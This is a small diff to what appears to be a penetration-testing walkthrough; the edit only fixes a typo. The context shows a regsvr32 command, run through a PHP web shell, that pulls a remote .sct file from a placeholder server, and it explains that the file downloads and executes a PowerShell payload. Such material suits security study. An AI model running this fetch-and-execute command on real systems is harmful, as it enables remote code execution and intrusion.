@@ -40,7 +40,7 @@ Exploit targets:
    3   Regsvr32
    4   PSH (Binary)
 
-11. Execute command regsvr32 /s /n /u /i:http://server/file.sct scrobj.dll using our PHP shell. Sessioc is created.
+11. Execute command regsvr32 /s /n /u /i:http://server/file.sct scrobj.dll using our PHP shell. Session is created.
 
 The module creates a web server that hosts an .sct file. When the user types the provided regsvr32 command on a system, 
 regsvr32 will request the .sct file and then execute the included PowerShell command. This command then downloads and executes the 
